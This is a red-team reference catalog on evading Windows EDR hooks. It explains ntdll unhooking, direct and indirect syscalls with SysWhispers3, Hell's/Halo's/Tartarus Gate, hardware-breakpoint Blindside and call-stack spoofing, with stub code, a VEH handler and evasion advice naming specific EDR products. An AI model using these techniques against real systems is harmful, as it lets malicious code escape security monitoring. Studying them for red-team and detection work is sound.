# Unhook / Direct / Indirect Syscall Technique Catalog

> Authorized red teams / adversary emulation / own-product testing only; using this against unauthorized targets is forbidden.

This document catalogs the mainstream "bypassing userland hooks" techniques, from the classic unhook to the newest hardware-breakpoint Blindside.
Every technique is mapped to MITRE ATT&CK T1562.001 / T1027 / T1055 for report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### Principle

An EDR's hooks all live in the **ntdll.dll inside the current process's memory**. The on-disk `C:\Windows\System32\ntdll.dll` is clean.
So remapping the disk ntdll into the current process and overwriting the in-memory `.text` section wipes the hooks.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (with EDR hook jmp) │ ◄── overwrite with the clean on-disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation points

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // use the native path to dodge monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Locate the .text section in the new mapping
// 5. NtProtectVirtualMemory to make the current ntdll .text RW
// 6. Overwrite with memcpy
// 7. NtProtectVirtualMemory to restore RX
```

### Caveats

- `NtProtectVirtualMemory` itself may be hooked → a chained problem. Fix: call `NtProtectVirtualMemory` with a **direct syscall** first
- Modern EDRs already monitor `NtProtectVirtualMemory` write operations against ntdll memory — combine with an ETW patch
- Peruns Fart leaves `KERNEL_MODULE_LOAD` and `PROTECTVM` events under ETW-TI — suppress ETW first, always

## 2. Direct Syscall

### Principle

Instead of calling ntdll's exported functions, write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps from userland straight to the kernel SSDT, bypassing any userland hook.

### SysWhispers3 usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stubs
syscallsstubs.std.x64.asm  - standard direct syscalls
```

In Visual Studio:

```text
1. Add the .asm to the project and enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) in place of the original NtAllocateVirtualMemory
```

### Minimal direct-syscall NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (SSN resolved dynamically)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // (writing a few bytes is omitted here for brevity)
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction lives in the implant's own `.text` (not inside ntdll) → kernel-mode telemetry easily spots "syscall from a non-ntdll address"
- This is exactly why indirect syscalls appeared

## 3. Indirect Syscall

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and the return address are under our control:

```text
Implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of a syscall;ret gadget inside ntdll>]   ; the syscall is not inside the implant
```

The gadget jumped to is usually the two-byte `syscall; ret` sequence at the tail of an `Nt*` function.
The RIP seen by kernel-mode ETW providers is an ntdll address, matching legitimate behavior patterns.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize the jmp target to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns the syscall;ret address inside ntdll -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to the legitimate syscall instruction inside ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

These three are the evolution of "dynamic SSN resolution".

### Hell's Gate

- Assumes ntdll is not hooked
- At implant startup, walks the `Nt*` exports of ntdll and extracts the SSN from the first 4 bytes `mov eax, <SSN>`
- Pros: no hardcoded SSNs; works across Windows versions
- Cons: if ntdll is already hooked (first byte turned into a jmp), extraction fails

### Halo's Gate

- Fixes Hell's Gate's hook problem
- If a function is found hooked (non-standard prologue), **scan ±N functions up/down**
- Exploits the fact that ntdll `Nt*` function SSNs increment consecutively; the hooked function's SSN is inferred from its neighbors

```text
Normal case:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is unreadable, look at the neighbors:
  nearest unhooked export above SSN = 0x17
  nearest unhooked export below SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Goes further against **advanced hooks that changed the SSN but kept the syscall instruction**
- Validates both the SSN and the syscall;ret gadget address
- The three together provide the most stable indirect-syscall foundation

### Reference implementations (after cloning in bootstrap)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (includes fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Principle

Use the debug registers `DR0-DR3` to place hardware breakpoints at the entries of EDR hook trampolines;
set up a VEH (Vectored Exception Handler) that, when a breakpoint hits, redirects RIP **directly past the hook trampoline**,
skipping the EDR's detection code and landing on the real syscall segment of ntdll.

### Advantages

- No need to write ntdll memory (no `NtProtectVirtualMemory` alerts)
- No need to unhook (the hook is still there; it is simply bypassed)
- ETW-TI sees no memory modification

### Implementation skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entry of each hooked function (4 max; combine with single-step rotation)
// 3. SetThreadContext(thread, &ctx) to write the DRx registers
// 4. When the EDR hook trampoline triggers a hardware breakpoint -> the VEH takes over
// 5. The VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to a legitimate syscall;ret in ntdll
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // the SSN is already in eax; R10 = RCX; jump to the syscall;ret in ntdll
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- The DRx registers are per-thread → they must be set separately for each thread
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass those with the earlier techniques first
- Win11 22H2+ introduces HVCI / some anti-debug mitigations that may interfere

## 6. Call Stack Spoofing

### Problem

Modern EDRs call `RtlCaptureStackBackTrace` at the kernel entry of syscalls such as `NtAllocateVirtualMemory` / `NtCreateThreadEx`
and report the full call stack. The implant's stack would show **non-image-backed memory** frames → a high-confidence alert.

### Option A: CallStackSpoofer (William Burgess)

Implementation idea:

1. Swap the current thread's stack to a forged legitimate stack before the syscall
2. Fill the forged frames with an all-legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. Swap back to the real stack after the syscall returns

### Option B: SilentMoonwalk

More aggressive; uses a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                trampoline restores → implant code continues
```

The key is unwinding: make `RtlVirtualUnwind` walk into the forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Real-world OPSEC suggestions

- call stack spoof + indirect syscall + ETW patch is currently a fairly solid combination against CrowdStrike / SentinelOne
- Spoof during the sleep phase too — spoofing only at execution time is not enough (EDRs sample periodically)

## 7. Technique Selection Comparison Table

| Technique | Counter | Complexity | Current effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | userland hooks | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | userland hooks | Low | Low-Medium (kernel sees RIP in the implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | userland hooks + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | hooks + no write operations | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | High | High | T1564 |

Recommended real-world chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoints): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing Callback

Unhooking is only half of the bypass; the other half is blinding telemetry: go to `references/telemetry-blinding.md`.
